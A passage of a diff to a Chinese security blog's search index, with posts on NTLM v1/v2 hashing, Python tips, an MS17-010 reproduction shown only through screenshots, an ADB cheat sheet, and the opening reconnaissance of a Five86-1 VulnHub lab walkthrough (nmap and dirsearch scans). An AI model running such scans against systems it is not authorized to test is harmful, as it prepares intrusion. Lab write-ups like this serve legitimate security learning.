+<p>NTLM version 2 (NTLMv2)是在 Windows NT 4.0 SP4中引入的（在 Windows 2000 中得到了本地支持），它通过加强协议来防止许多欺骗攻击，并增加服务器向客户机进行身份验证的能力，从而增强了 NTLM的安全性</p>
 </blockquote>
-<p>Client 通过第二步获的 Server 的 Session Key ，创建用于证明自己就是 Ticket 的真正所有者的 Authenticator 和时间戳，并使用 Server的 Session Key 进行加密</p>
-<p>向服务器请求后，服务器用自己的 Master Key 解密  Ticket ，得到 <em>Server Session Key*，使用 *Server Session Key</em> 解密 Authenticator 进行验证，同上一步一样<br>验证成功后返回给 Client <strong>新时间戳</strong>，<strong>使用 Server Session Key 加密</strong></p>
-<p>Client 通过缓存中的 <code>Server Session Key</code> 解密服务器返回信息，得到新时间戳并验证其是否正确。验证通过的话则客户端可以信赖服务器，并向服务器发送服务请求，服务器向客户端提供相应的服务</p>
-<p>校验通过后，认证成功，该票据会一直存在客户端内存中</p>
-<p><img src="./%E5%9F%9F%E8%AE%A4%E8%AF%81%E7%AC%AC%E4%B8%89%E6%AD%A5.png" alt="域认证第三步" title="域认证第三步"></p>
+<p><code>NTLM v1</code> 与 <code>NTLM v2</code> 最显著的区别就是 <code>Challenge</code> 与 <strong>加密算法</strong> 不同，共同点就是加密的原料都是 <code>NTLM Hash</code> ：</p>
+<ul>
+<li>Challenge：<ul>
+<li><code>v1</code>： 8-byte</li>
+<li><code>v2</code>：16-byte </li>
+</ul>
+</li>
+<li>Net NTLM Hash：<ul>
+<li><code>v1</code>：DES</li>
+<li><code>v2</code>： HMAC-MD5</li>
+</ul>
+</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># NTLM</span></span><br><span class="line"></span><br><span class="line">C = <span class="number">8</span>-byte server challenge, random</span><br><span class="line">K1 | K2 | K3 = NTLM-Hash | <span class="number">5</span>-bytes<span class="number">-0</span></span><br><span class="line">response = DES(K1,C) | DES(K2,C) | DES(K3,C)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># NTLM v2</span></span><br><span class="line"></span><br><span class="line">SC = <span class="number">8</span>-byte server challenge, random</span><br><span class="line">CC = <span class="number">8</span>-byte client challenge, random</span><br><span class="line">CC* = (X, time, CC2, domain name)</span><br><span class="line">v2-Hash = HMAC-MD5(NT-Hash, user name, domain name)</span><br><span class="line">LMv2 = HMAC-MD5(v2-Hash, SC, CC)</span><br><span class="line">NTv2 = HMAC-MD5(v2-Hash, SC, CC*)</span><br><span class="line">response = LMv2 | CC | NTv2 | CC*</span><br></pre></td></tr></table></figure>
+
 <br>
 
 <h2 id="Ref"><a href="#Ref" class="headerlink" title="Ref"></a>Ref</h2><ul>
-<li><a href="https://blog.csdn.net/wy_97/article/details/87649262" target="_blank" rel="noopener">windows 域认证 Kerberos详解</a></li>
-<li><a href="https://www.secpulse.com/archives/94848.html" target="_blank" rel="noopener">彻底理解Windows认证 - 议题解读</a></li>
-<li><a href="https://blog.csdn.net/wulantian/article/details/42418231" target="_blank" rel="noopener">kerberos认证原理—讲的非常细致，易懂</a></li>
-<li><a href="https://zh.wikipedia.org/wiki/Kerberos" target="_blank" rel="noopener">Kerberos</a></li>
+<li><a href="http://wikipedia.moesalih.com/NTLM" target="_blank" rel="noopener">NT LAN Manager</a></li>
+<li><a href="http://www.voidcn.com/article/p-voxshmho-sn.html" target="_blank" rel="noopener">NTLM 协议</a></li>
+<li><a href="https://3gstudent.github.io/3gstudent.github.io/Windows%E4%B8%8B%E7%9A%84%E5%AF%86%E7%A0%81hash-NTLM-hash%E5%92%8CNet-NTLM-hash%E4%BB%8B%E7%BB%8D/" target="_blank" rel="noopener">Windows下的密码hash——NTLM hash和Net-NTLM hash介绍</a></li>
 </ul>
 ]]></content>
       <tags>
+        <tag>Security</tag>
         <tag>Windows</tag>
         <tag>渗透测试</tag>
-        <tag>Security</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Python不常用用法</title>
+    <url>/2019/09/04/Python%E4%B8%8D%E5%B8%B8%E7%94%A8%E7%94%A8%E6%B3%95/</url>
+    <content><![CDATA[<p>Python 日常使用时的一些方法或技巧，怕忘记怕麻烦，记录一下</p>
+<a id="more"></a>
+
+<h2 id="通过值获取键"><a href="#通过值获取键" class="headerlink" title="通过值获取键"></a>通过值获取键</h2><br>
+
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>dct = &#123;<span class="string">'Name'</span>: <span class="string">'Alice'</span>, <span class="string">'Age'</span>: <span class="number">18</span>, <span class="string">'uid'</span>: <span class="number">1001</span>, <span class="string">'id'</span>: <span class="number">1001</span>&#125;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="function"><span class="keyword">def</span> <span class="title">get_key1</span><span class="params">(dct, value)</span>:</span></span><br><span class="line"><span class="meta">... </span>  <span class="keyword">return</span> list(filter(<span class="keyword">lambda</span> k:dct[k] == value, dct))</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>get_key1(dct, <span class="number">1001</span>)</span><br><span class="line">[<span class="string">'id'</span>, <span class="string">'uid'</span>]</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 某函数返回的结果（参数 md5dict）</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">'/root/MyDocs/Python/02-PhotosMD5/76478297_p0.jpg'</span>: <span class="string">'6beb7af8d37e26eb88bb1b75c8e51474'</span>, </span><br><span class="line">    <span class="string">'/root/MyDocs/Python/02-PhotosMD5/76478297_p0_copy.jpg'</span>: <span class="string">'6beb7af8d37e26eb88bb1b75c8e51474'</span>, </span><br><span class="line">    <span class="string">'/root/MyDocs/Python/02-PhotosMD5/561284.jpg'</span>: <span class="string">'4f9d1c75bd62b0d7e3fdd0abd810ce34'</span>, </span><br><span class="line">    <span class="string">'/root/MyDocs/Python/02-PhotosMD5/561271.jpg'</span>: <span class="string">'bb60b6e6626968cde17cad0a8f18290b'</span>, </span><br><span class="line">    <span class="string">'/root/MyDocs/Python/02-PhotosMD5/561279.jpg'</span>: <span class="string">'e5af4c3275dafbef5932ab69c446374c'</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 变量 cp的内容</span></span><br><span class="line">(<span class="string">'6beb7af8d37e26eb88bb1b75c8e51474'</span>, <span class="number">2</span>)</span><br><span class="line">(<span class="string">'4f9d1c75bd62b0d7e3fdd0abd810ce34'</span>, <span class="number">1</span>)</span><br><span class="line">(<span class="string">'bb60b6e6626968cde17cad0a8f18290b'</span>, <span class="number">1</span>)</span><br><span class="line">(<span class="string">'e5af4c3275dafbef5932ab69c446374c'</span>, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">analysedDict</span><span class="params">(md5dict)</span>:</span></span><br><span class="line">    cp = Counter(md5dict.values())  <span class="comment"># 只取 MD5值</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">filterFun</span><span class="params">(dicts, value)</span>:</span></span><br><span class="line">        bad = list(filter(<span class="keyword">lambda</span> k:dicts[k] == value, dicts))</span><br><span class="line">        print(bad)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> cp.items():</span><br><span class="line">        <span class="keyword">if</span> i[<span class="number">1</span>] &gt; <span class="number">1</span>:</span><br><span class="line">            print(<span class="string">"\033[0;31m&#123;0&#125;\033[0m"</span>.format(i))</span><br><span class="line">            filterFun(md5dict, i[<span class="number">0</span>])</span><br><span class="line">            </span><br><span class="line"><span class="comment"># ---- 结果 ------</span></span><br><span class="line"><span class="comment"># ('6beb7af8d37e26eb88bb1b75c8e51474', 2)</span></span><br><span class="line"><span class="comment"># ['/root/MyDocs/Python/02-PhotosMD5/76478297_p0.jpg', '/root/MyDocs/Python/02-PhotosMD5/76478297_p0_copy.jpg']</span></span><br></pre></td></tr></table></figure>
+
+<br>
+
+<h2 id="快速启动-http服务器"><a href="#快速启动-http服务器" class="headerlink" title="快速启动 http服务器"></a>快速启动 http服务器</h2><br>
+
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># python2</span></span><br><span class="line">python -m SimpleHTTPServer</span><br></pre></td></tr></table></figure>]]></content>
+      <tags>
+        <tag>Python</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>MS17-010复现</title>
+    <url>/2019/09/13/MS17-010%E5%A4%8D%E7%8E%B0/</url>
+    <content><![CDATA[<p>MS17-010/EternalBlue/永恒之蓝</p>
+<a id="more"></a>
+
+<p><a href="https://docs.microsoft.com/zh-cn/security-updates/securitybulletins/2017/ms17-010" target="_blank" rel="noopener">Microsoft 安全公告 MS17-010</a></p>
+<p>当 Microsoft 服务器消息块 1.0 (SMBv1)服务器处理某些请求时，存在多个远程执行代码漏洞。<br>成功利用这些漏洞的攻击者可以获取在目标系统上执行代码的能力</p>
+<p>受影响的系统(详细系统版本请查看公告)：</p>
+<ul>
+<li>Windows Vista</li>
+<li>Windows Server 2008</li>
+<li>Windows 7</li>
+<li>Windows Server 2008 R2</li>
+<li>Windows 8.1</li>
+<li>Windows Server 2012 和 Windows Server 2012 R2</li>
+<li>Windows RT 8.1</li>
+<li>Windows 10</li>
+<li>Windows Server 2016</li>
+</ul>
+<p>相对应的 CVE（Windows SMB 远程代码执行漏洞）：</p>
+<ul>
+<li>CVE-2017-0143</li>
+<li>CVE-2017-0144</li>
+<li>CVE-2017-0145</li>
+<li>CVE-2017-0146</li>
+<li>CVE-2017-0148</li>
+</ul>
+<br>
+
+<p>复现环境：</p>
+<ul>
+<li>Windows 7 (Build 7601, Service Pack 1)</li>
+<li>Ubuntu server(Metasploit)</li>
+</ul>
+<br>
+
+<p><img src="./2019-09-13%2011-24-58%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="000" title="搜索漏洞"><br><img src="./2019-09-13%2011-10-05%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="001" title="扫描模块"><br><img src="./2019-09-13%2010-41-45%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="002" title="返回 meterpreter"></p>
+]]></content>
+      <tags>
+        <tag>漏洞复现</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>ADB常用命令</title>
+    <url>/2019/06/21/ADB%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/</url>
+    <content><![CDATA[<blockquote><p>摘下红花送伊人<br>红花似火绾青丝<br>红花啊红花，绾起伊人的青丝<br>伊人笑靥如花</p>
+<p>摘下白花送伊人<br>白花如雪别心口<br>白花啊白花，别在伊人的心口<br>伊人皎洁如月<br>伊人皎洁如月</p>
+<footer><strong>美绪</strong><cite><a href="https://www.bilibili.com/bangumi/play/ep259703" target="_blank" rel="noopener">Bilibili《多罗罗》</a></cite></footer></blockquote>
+
+<a id="more"></a>
+
+<hr>
+<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=1353269777&auto=1&height=66"></iframe>
+
+<p><img src="73547799_p0.jpg" alt="73547799_p0.jpg"></p>
+<!--  -->
+
+<br>
+
+<h2 id="基本与应用"><a href="#基本与应用" class="headerlink" title="基本与应用"></a>基本与应用</h2><hr>
+<h3 id="查看设备"><a href="#查看设备" class="headerlink" title="查看设备"></a>查看设备</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ adb devices </span><br><span class="line"><span class="comment"># List of devices attached</span></span><br><span class="line"><span class="comment"># cf264b8f	device</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="进入shell"><a href="#进入shell" class="headerlink" title="进入shell"></a>进入shell</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ adb shell</span><br><span class="line"><span class="comment"># OnePlus3T:/ $ ll</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="以-root-权限运行-手机需要-root"><a href="#以-root-权限运行-手机需要-root" class="headerlink" title="以 root 权限运行(手机需要 root)"></a>以 root 权限运行(手机需要 root)</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">adb root</span><br><span class="line"><span class="comment"># restarting adbd as root</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># adbd cannot run as root in production builds</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="无线连接（需要借助-USB-线）"><a href="#无线连接（需要借助-USB-线）" class="headerlink" title="无线连接（需要借助 USB 线）"></a>无线连接（需要借助 USB 线）</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 找到 IP地址(ifconfig/ip addr/ip link)</span></span><br><span class="line">OnePlus3T:/ $ ifconfig</span><br><span class="line"></span><br><span class="line"><span class="comment"># 让设备在 任意 端口监听 TCP/IP 连接</span></span><br><span class="line">root@arch ~ -&gt;<span class="comment"># adb tcpip 8848</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 断开连接</span></span><br><span class="line"><span class="comment"># 通过 IP 地址连接设备</span></span><br><span class="line">adb connect &lt;device-ip-address[:port]&gt;</span><br><span class="line"></span><br><span class="line">root@arch ~ -&gt;<span class="comment"># adb connect 192.168.1.3:8848</span></span><br><span class="line"><span class="comment"># connected to 192.168.1.3:8848</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看设备是否出现</span></span><br><span class="line">root@arch ~ -&gt;<span class="comment"># adb devices</span></span><br><span class="line"><span class="comment"># List of devices attached</span></span><br><span class="line"><span class="comment"># 192.168.1.3:8848	unauthorized</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="断开无线连接"><a href="#断开无线连接" class="headerlink" title="断开无线连接"></a>断开无线连接</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">adb disconnect &lt;device-ip-address&gt;</span><br><span class="line"></span><br><span class="line">root@arch ~ -&gt;<span class="comment"># adb disconnect 192.168.1.3:8848</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="查看应用列表"><a href="#查看应用列表" class="headerlink" title="查看应用列表"></a>查看应用列表</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># adb shell pm list packages [-f] [-d] [-e] [-s] [-3] [-i] [-u] [--user USER_ID] [FILTER]</span></span><br><span class="line"><span class="comment"># -s 	只显示系统应用</span></span><br><span class="line"><span class="comment"># -3 	只显示第三方应用</span></span><br><span class="line"><span class="comment"># &lt;FILTER&gt; 	包名包含 &lt;FILTER&gt; 字符串</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">root@arch ~ -&gt;<span class="comment"># adb shell pm list packages -3</span></span><br><span class="line"><span class="comment"># package:com.github.shadowsocks</span></span><br><span class="line"><span class="comment"># package:com.chenupt.day</span></span><br><span class="line"><span class="comment"># package:org.telegram.messenger</span></span><br><span class="line"><span class="comment"># package:com.niksoftware.snapseed</span></span><br><span class="line"></span><br><span class="line">root@arch ~ -&gt;<span class="comment"># adb shell pm list packages -s</span></span><br><span class="line"><span class="comment"># package:com.oneplus.calculator</span></span><br><span class="line"><span class="comment"># package:net.oneplus.weather</span></span><br><span class="line"><span class="comment"># package:com.android.cts.priv.ctsshim</span></span><br><span class="line"></span><br><span class="line">root@arch ~ -&gt;<span class="comment"># adb shell pm list packages bili</span></span><br><span class="line"><span class="comment"># package:com.hypergryph.arknights.bilibili</span></span><br><span class="line"><span class="comment"># package:com.bilibili.comic</span></span><br><span class="line"><span class="comment"># package:com.digitalsky.girlsfrontline.cn.bili</span></span><br><span class="line"><span class="comment"># package:tv.danmaku.bili</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="安装-卸载-APK"><a href="#安装-卸载-APK" class="headerlink" title="安装/卸载 APK"></a>安装/卸载 APK</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># adb install [-lrtsdg] &lt;path_to_apk&gt;</span></span><br><span class="line"><span class="comment"># -l 	将应用安装到保护目录 /mnt/asec</span></span><br><span class="line"><span class="comment"># -r 	允许覆盖安装</span></span><br><span class="line"><span class="comment"># -t 	允许安装 AndroidManifest.xml 里 application 指定 android:testOnly="true" 的应用</span></span><br><span class="line"><span class="comment"># -s 	将应用安装到 sdcard</span></span><br><span class="line"><span class="comment"># -d 	允许降级覆盖安装</span></span><br><span class="line"><span class="comment"># -g 	授予所有运行时权限</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 详细 : &lt;https://github.com/mzlogin/awesome-adb#%E5%AE%89%E8%A3%85-apk&gt;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># adb uninstall [-k] &lt;packagename&gt;</span></span><br><span class="line"><span class="comment"># &lt;packagename&gt; 表示应用的包名，-k 参数可选，表示卸载应用但保留数据和缓存目录</span></span><br><span class="line"></span><br><span class="line">root@arch ~ -&gt;<span class="comment"># adb uninstall com.bilibili.comic</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="清除应用数据与缓存"><a href="#清除应用数据与缓存" class="headerlink" title="清除应用数据与缓存"></a>清除应用数据与缓存</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># adb shell dumpsys package &lt;packagename&gt;</span></span><br><span class="line">root@arch ~ -&gt;<span class="comment"># adb shell pm clear com.bilibili.comic</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="查看应用详细信息"><a href="#查看应用详细信息" class="headerlink" title="查看应用详细信息"></a>查看应用详细信息</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@arch ~ -&gt;<span class="comment"># adb shell dumpsys package com.bilibili.comic</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="查看应用安装路径"><a href="#查看应用安装路径" class="headerlink" title="查看应用安装路径"></a>查看应用安装路径</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># adb shell pm path &lt;PACKAGE&gt;</span></span><br><span class="line"></span><br><span class="line">root@arch ~ -&gt;<span class="comment"># adb shell pm path com.bilibili.comic </span></span><br><span class="line"><span class="comment"># package:/data/app/com.bilibili.comic-VefU-I3Sq3yFa7hzXBuAXg==/base.apk</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="强制停止应用"><a href="#强制停止应用" class="headerlink" title="强制停止应用"></a>强制停止应用</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># adb shell am force-stop &lt;packagename&gt;</span></span><br><span class="line"></span><br><span class="line">root@arch ~ -&gt;<span class="comment"># adb shell am force-stop com.taobao.taoba</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="文件管理"><a href="#文件管理" class="headerlink" title="文件管理"></a>文件管理</h2><hr>
+<h3 id="复制设备里的文件到电脑"><a href="#复制设备里的文件到电脑" class="headerlink" title="复制设备里的文件到电脑"></a>复制设备里的文件到电脑</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># adb pull &lt;设备里的文件路径&gt; [电脑上的目录]</span></span><br><span class="line"></span><br><span class="line">root@arch ~ -&gt;<span class="comment"># adb pull /sdcard/Pictures ~/Pictures</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="复制电脑里的文件到设备"><a href="#复制电脑里的文件到设备" class="headerlink" title="复制电脑里的文件到设备"></a>复制电脑里的文件到设备</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># adb push &lt;电脑上的文件路径&gt; &lt;设备里的目录&gt;</span></span><br><span class="line"></span><br><span class="line">root@arch ~ -&gt;<span class="comment"># adb push ~/Documents/Python/hello.py /sdcard/Python</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="模拟按键-输入"><a href="#模拟按键-输入" class="headerlink" title="模拟按键/输入"></a>模拟按键/输入</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># input [&lt;source&gt;] &lt;command&gt; [&lt;arg&gt;...]</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># adb shell input keyevent &lt;keycode&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 亮屏</span></span><br><span class="line">root@arch ~ -&gt;<span class="comment"># adb shell input keyevent 224</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 详细: &lt;https://github.com/mzlogin/awesome-adb#%E6%A8%A1%E6%8B%9F%E6%8C%89%E9%94%AE%E8%BE%93%E5%85%A5&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="实用功能"><a href="#实用功能" class="headerlink" title="实用功能"></a>实用功能</h2><h3 id="截图保存到电脑"><a href="#截图保存到电脑" class="headerlink" title="截图保存到电脑"></a>截图保存到电脑</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@arch ~ -&gt;<span class="comment"># adb exec-out screencap -p &gt; sc.png</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="录制屏幕"><a href="#录制屏幕" class="headerlink" title="录制屏幕"></a>录制屏幕</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 录制屏幕以 mp4 格式保存到 /sdcard</span></span><br><span class="line">adb shell screenrecord /sdcard/filename.mp4</span><br><span class="line"></span><br><span class="line"><span class="comment"># 按 Ctrl-C 停止</span></span><br><span class="line"><span class="comment"># 默认录制时间和最长录制时间都是 180 秒</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># --size WIDTHxHEIGHT 	视频的尺寸，比如 1280x720，默认是屏幕分辨率。</span></span><br><span class="line"><span class="comment"># --bit-rate RATE 	视频的比特率，默认是 4Mbps。</span></span><br><span class="line"><span class="comment"># --time-limit TIME 	录制时长，单位秒。</span></span><br><span class="line"><span class="comment"># --verbose 	输出更多信息。</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="Top-amp-amp-ps"><a href="#Top-amp-amp-ps" class="headerlink" title="Top &amp;&amp; ps"></a>Top &amp;&amp; ps</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@arch ~ -&gt;<span class="comment"># adb shell top</span></span><br><span class="line"></span><br><span class="line">root@arch ~ -&gt;<span class="comment"># adb shell ps</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="查看进程-UID"><a href="#查看进程-UID" class="headerlink" title="查看进程 UID"></a>查看进程 UID</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># adb shell dumpsys package &lt;packagename&gt; | grep userId=</span></span><br><span class="line"></span><br><span class="line">root@arch ~ -&gt;<span class="comment"># adb shell dumpsys package com.bilibili.comic | grep userId=</span></span><br><span class="line">    <span class="comment"># userId=10203</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>基本的 linux命令（ls/cat/df/rm/…）</p>
+</blockquote>
+<h2 id="Ref"><a href="#Ref" class="headerlink" title="Ref"></a>Ref</h2><ul>
+<li><a href="https://github.com/mzlogin/awesome-adb#%E6%A8%A1%E6%8B%9F%E6%8C%89%E9%94%AE%E8%BE%93%E5%85%A5" target="_blank" rel="noopener">ADB Usage Complete / ADB 用法大全</a> </li>
+</ul>
+]]></content>
+      <tags>
+        <tag>Android</tag>
       </tags>
   </entry>
   <entry>
@@ -1204,6 +990,238 @@ nslookup会得到 DNS解析服务器保存在缓存中的非权威解答
       <tags>
         <tag>vulnhub</tag>
         <tag>OSCP</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Five86-1</title>
+    <url>/2020/03/10/Five86-1/</url>
+    <content><![CDATA[<blockquote>
+<p><code>2020-02-14 14</code> —— <code>2020-02-14 16</code> </p>
+</blockquote>
+<br>
+
+<figure class="highlight applescript"><table><tr><td class="code"><pre><span class="line">Description</span><br><span class="line">Five86<span class="number">-1</span> <span class="keyword">is</span> another purposely built vulnerable lab <span class="keyword">with</span> <span class="keyword">the</span> intent <span class="keyword">of</span> gaining experience <span class="keyword">in</span> <span class="keyword">the</span> world <span class="keyword">of</span> penetration testing.</span><br><span class="line"></span><br><span class="line">The ultimate goal <span class="keyword">of</span> this challenge <span class="keyword">is</span> <span class="keyword">to</span> <span class="keyword">get</span> root <span class="keyword">and</span> <span class="keyword">to</span> <span class="built_in">read</span> <span class="keyword">the</span> one <span class="keyword">and</span> only flag.</span><br><span class="line"></span><br><span class="line">Linux skills <span class="keyword">and</span> familiarity <span class="keyword">with</span> <span class="keyword">the</span> Linux command line are a must, <span class="keyword">as</span> <span class="keyword">is</span> <span class="keyword">some</span> experience <span class="keyword">with</span> basic penetration testing tools.</span><br><span class="line"></span><br><span class="line">For beginners, Google can be <span class="keyword">of</span> great assistance, <span class="keyword">but</span> you can always tweet <span class="keyword">me</span> <span class="keyword">at</span> @DCAU7 <span class="keyword">for</span> assistance <span class="keyword">to</span> <span class="keyword">get</span> you going again. But take note: I won't give you <span class="keyword">the</span> answer, instead, I'll give you an idea <span class="keyword">about</span> how <span class="keyword">to</span> move forward.</span><br><span class="line"></span><br><span class="line">Technical Information</span><br><span class="line">Five86<span class="number">-1</span> <span class="keyword">is</span> a VirtualBox VM built <span class="keyword">on</span> Debian <span class="number">64</span> bit, <span class="keyword">but</span> there shouldn't be any issues <span class="built_in">running</span> <span class="keyword">it</span> <span class="keyword">on</span> most PCs.</span><br><span class="line"></span><br><span class="line">Five86<span class="number">-1</span> has been tested successfully <span class="keyword">on</span> VMWare Player, <span class="keyword">but</span> <span class="keyword">if</span> there are any issues <span class="built_in">running</span> this VM <span class="keyword">in</span> VMware, have a <span class="built_in">read</span> <span class="keyword">through</span> <span class="keyword">of</span> this.</span><br><span class="line"></span><br><span class="line">It <span class="keyword">is</span> currently configured <span class="keyword">for</span> Bridged Networking, however, this can be changed <span class="keyword">to</span> suit your requirements. Networking <span class="keyword">is</span> configured <span class="keyword">for</span> DHCP.</span><br><span class="line"></span><br><span class="line">Installation <span class="keyword">is</span> simple - download <span class="keyword">it</span>, unzip <span class="keyword">it</span>, <span class="keyword">and</span> <span class="keyword">then</span> import <span class="keyword">it</span> <span class="keyword">into</span> VirtualBox <span class="keyword">or</span> VMWare <span class="keyword">and</span> away you go.</span><br><span class="line"></span><br><span class="line">Important</span><br><span class="line">While there should be no problems using this VM, <span class="keyword">by</span> downloading <span class="keyword">it</span>, you accept full responsibility <span class="keyword">for</span> any unintentional damage <span class="keyword">that</span> this VM may cause.</span><br><span class="line"></span><br><span class="line">In saying <span class="keyword">that</span>, there shouldn't be any problems, <span class="keyword">but</span> I feel <span class="keyword">the</span> need <span class="keyword">to</span> throw this out there just <span class="keyword">in</span> case.</span><br><span class="line"></span><br><span class="line">Credits</span><br><span class="line">A big thanks goes out <span class="keyword">to</span> <span class="keyword">the</span> members <span class="keyword">of</span> @m0tl3ycr3w.</span><br><span class="line"></span><br><span class="line">Contact</span><br><span class="line">I'm also very interested <span class="keyword">in</span> hearing how people go <span class="keyword">about</span> solving these challenges, so <span class="keyword">if</span> you're up <span class="keyword">for</span> writing a walkthrough, please do so <span class="keyword">and</span> send <span class="keyword">me</span> a link, <span class="keyword">or</span> alternatively, follow <span class="keyword">me</span> <span class="keyword">on</span> Twitter, <span class="keyword">and</span> DM <span class="keyword">me</span> (you can unfollow <span class="keyword">after</span> you've DM'd <span class="keyword">me</span> <span class="keyword">if</span> you'd prefer).</span><br><span class="line"></span><br><span class="line">I can be contacted via Twitter - @Five86_x</span><br></pre></td></tr></table></figure>
+
+<br>
+<br>
+
+
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Kali : 192.168.56.109</span><br><span class="line">目标网段 : 192.168.56.1/24</span><br></pre></td></tr></table></figure>
+
+<br>
+
+<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><br>
+
+<p>主机存活：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ nmap -s -sn -T5 -v 192.168.56.1/24 | grep -B 1 <span class="string">"Host is up"</span></span><br></pre></td></tr></table></figure>
+
+<p>扫服务：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ nmap -n -Pn -sV -O 192.168.56.114</span><br></pre></td></tr></table></figure>
+
+<br>
+
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">PORT      STATE SERVICE VERSION</span><br><span class="line">22/tcp    open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)</span><br><span class="line">80/tcp    open  http    Apache httpd 2.4.38 ((Debian))</span><br><span class="line">10000/tcp open  http    MiniServ 1.920 (Webmin httpd)</span><br></pre></td></tr></table></figure>
+
+<br>
+
+<hr>
+<br>
+
+<p>访问 80 端口，无有价值信息</p>
+<p>例行扫目录：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dirsearch.py -u http://192.168.56.114 -e php --random-agents</span><br></pre></td></tr></table></figure>
+
+<br>
+
+<p><img src="2020-02-14-14-35-51%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt> </p>
+<br>
+
+<p>经访问：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">########################</span></span><br><span class="line">[14:35:21] 200 -   30B  - /index.html    <span class="comment"># 404</span></span><br><span class="line">[14:35:25] 401 -  461B  - /reports          <span class="comment"># need user|passwd</span></span><br><span class="line">[14:35:25] 401 -  461B  - /reports/Webalizer/   <span class="comment"># need user|passwd</span></span><br><span class="line">[14:35:25] 200 -   29B  - /robots.txt</span><br><span class="line"><span class="comment">#####</span></span><br><span class="line">http://192.168.56.114/robots.txt</span><br><span class="line">User-agent: *</span><br><span class="line">Disallow: /ona</span><br><span class="line"><span class="comment">########################</span></span><br><span class="line">http://192.168.56.114/ona	<span class="comment"># OpenNetAdmin</span></span><br></pre></td></tr></table></figure>
+
+<br>
+
